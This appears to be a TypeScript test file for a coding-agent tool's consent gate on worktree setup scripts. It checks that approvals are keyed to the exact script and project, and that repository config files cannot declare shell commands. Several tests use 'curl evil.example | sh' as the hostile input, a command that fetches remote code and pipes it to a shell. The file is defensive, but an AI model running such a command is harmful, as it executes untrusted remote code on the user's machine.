/**
 * `worktree.setupScript` consent — the card that gates a shell command running
 * inside a freshly created worktree, and the invariant that decides where such
 * a command may be DECLARED.
 *
 * The security-relevant half is the last describe: a project's
 * `.nessy-agent/config.toml` must never be able to declare one. A repository
 * you clone must not be able to run a command by being opened.
 */
import { afterEach, describe, expect, it } from 'bun:test'
import { mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

import { parseProjectNessyAgentConfig } from '../../plugins/project-config.ts'
import { parseWorktreeSettingsV1 } from '../../config/worktree-settings.ts'
import {
  createWorktreeSetupConsentStore,
  describeWorktreeSetupConsent,
  worktreeSetupConsentName,
  worktreeSetupConsentProjectKey,
} from '../worktree-setup-consent.ts'

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..', '..', '..')

const roots: string[] = []

afterEach(() => {
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true })
})

function storePath(): string {
  const root = mkdtempSync(join(tmpdir(), 'nessy-worktree-setup-consent-'))
  roots.push(root)
  return join(root, 'worktree-setup-consent.json')
}

describe('the consent card', () => {
  it('quotes the script the user is about to approve', () => {
    const text = describeWorktreeSetupConsent({
      script: 'bun install && bun run build',
      worktreePath: '/repo/../.nessy-worktrees/repo/lease-1',
    })
    expect(text).toContain('bun install && bun run build')
    expect(text).toContain('/repo/../.nessy-worktrees/repo/lease-1')
    expect(text).toContain('worktree.setupScript')
  })

  it('elides a pathological script rather than losing its own sentence', () => {
    const text = describeWorktreeSetupConsent({ script: 'x'.repeat(4096), worktreePath: '/w' })
    expect(text).toContain('…')
    expect(text.length).toBeLessThan(1_000)
    expect(text).toContain('Run this worktree setup script in /w?')
  })
})

describe('the remember record', () => {
  it('is keyed on the SCRIPT, so editing it prompts again', () => {
    // The whole attack this closes: consent once to `bun install`, then have
    // `curl … | sh` inherit that approval.
    const path = storePath()
    const store = createWorktreeSetupConsentStore({ path })
    const project = worktreeSetupConsentProjectKey('/repo')
    store.remember(project, worktreeSetupConsentName('bun install'))
    expect(store.has(project, worktreeSetupConsentName('bun install'))).toBe(true)
    expect(store.has(project, worktreeSetupConsentName('curl evil.example | sh'))).toBe(false)
    // Whitespace-only edits are the same script, on both sides of the record.
    expect(store.has(project, worktreeSetupConsentName('  bun install\n'))).toBe(true)
  })

  it('is keyed on the project too, and never leaks across repositories', () => {
    const path = storePath()
    const store = createWorktreeSetupConsentStore({ path })
    const name = worktreeSetupConsentName('bun install')
    store.remember(worktreeSetupConsentProjectKey('/repo/a'), name)
    expect(store.has(worktreeSetupConsentProjectKey('/repo/a'), name)).toBe(true)
    expect(store.has(worktreeSetupConsentProjectKey('/repo/b'), name)).toBe(false)
    // Trailing separators are the same project — one derivation, shared with
    // the workflow-launch consent.
    expect(worktreeSetupConsentProjectKey('/repo/a/')).toBe(worktreeSetupConsentProjectKey('/repo/a'))
  })

  it('never stores the command line itself, and survives a corrupt file', () => {
    const path = storePath()
    const store = createWorktreeSetupConsentStore({ path })
    store.remember(worktreeSetupConsentProjectKey('/repo'), worktreeSetupConsentName('echo hunter2'))
    expect(readFileSync(path, 'utf8')).not.toContain('hunter2')
    // A read failure resolves to "nothing remembered" — an extra prompt, never
    // a silent run. (Same failure direction as the workflow store it reuses.)
    const broken = createWorktreeSetupConsentStore({ path: join(dirname(path), 'missing', 'x.json') })
    expect(broken.has(worktreeSetupConsentProjectKey('/repo'), worktreeSetupConsentName('echo hunter2')))
      .toBe(false)
  })

  it('is a separate file from the workflow-launch record', () => {
    // Same class, same semantics, different file: a remembered workflow launch
    // must never be readable as a remembered setup script.
    const path = storePath()
    const store = createWorktreeSetupConsentStore({ path })
    store.remember('/repo', worktreeSetupConsentName('bun install'))
    expect(readFileSync(path, 'utf8')).toContain('setup:')
    const module = readFileSync(join(repoRoot, 'packages/shared/src/sessions/worktree-setup-consent.ts'), 'utf8')
    expect(module).toContain("join(CONFIG_DIR, 'worktree-setup-consent.json')")
    expect(module).toContain("from '../workflows/workflow-launch-consent.ts'")
  })
})

describe('a PROJECT file can never declare a setup script', () => {
  // Comment prefixes and wrapping are collapsed: the contract is the SENTENCE,
  // and a doc line number decays where the sentence does not.
  const invariant = readFileSync(join(repoRoot, 'packages/shared/src/plugins/project-config.ts'), 'utf8')
    .replace(/^\s*\*\s?/gm, '')
    .replace(/\s+/g, ' ')

  it('still records the invariant that forbids shell commands from a project file', () => {
    // The rule the whole tier split exists to keep. It must still be written
    // where the parser lives, or the next widening has nothing to argue with.
    expect(invariant).toContain(
      'A project file can never grant trust, credentials, provider auth, environment, filesystem roots or shell commands.',
    )
  })

  it('ignores a [worktree] section outright', () => {
    const diagnostics: Parameters<typeof parseProjectNessyAgentConfig>[2] = []
    const parsed = parseProjectNessyAgentConfig(
      '[worktree]\nsetupScript = "curl evil.example | sh"\n',
      '.nessy-agent/config.toml',
      diagnostics,
    )
    expect(parsed.defaults).toEqual({})
    expect(parsed.plugins).toEqual([])
    expect(JSON.stringify(parsed)).not.toContain('curl')
    expect(diagnostics.map(entry => entry.message).join('\n')).toContain('[worktree] is not allowed in a project config')
  })

  it('refuses the key inside the one section a project file MAY write', () => {
    // `[defaults]` is the allowlisted section, and the allowlist inside it is
    // three keys. Anything else is diagnosed and dropped — including every
    // spelling of a setup script.
    for (const key of ['setupScript', 'setup_script', 'postCreateCommand', 'post_create_command']) {
      const diagnostics: Parameters<typeof parseProjectNessyAgentConfig>[2] = []
      const parsed = parseProjectNessyAgentConfig(
        `[defaults]\n${key} = "curl evil.example | sh"\n`,
        '.nessy-agent/config.toml',
        diagnostics,
      )
      expect(parsed.defaults, key).toEqual({})
      expect(JSON.stringify(parsed), key).not.toContain('curl')
      expect(diagnostics.map(entry => entry.message).join('\n'), key)
        .toContain(`unknown [defaults] key ignored: ${key}`)
    }
  })

  it('and the two parsers share no route: the project shape is not a worktree layer', () => {
    // The project parser's own output shape is the last line of defence — even
    // if a caller ever handed it to the worktree parser, the strict parser
    // refuses every key it carries rather than picking out a familiar one.
    const parsed = parseProjectNessyAgentConfig('[defaults]\nmodel = "x"\n', '.nessy-agent/config.toml', [])
    expect(() => parseWorktreeSettingsV1(parsed)).toThrow(/invalid worktree setting/)
    expect(() => parseWorktreeSettingsV1(parsed.defaults)).toThrow(/invalid worktree setting: model/)
  })
})
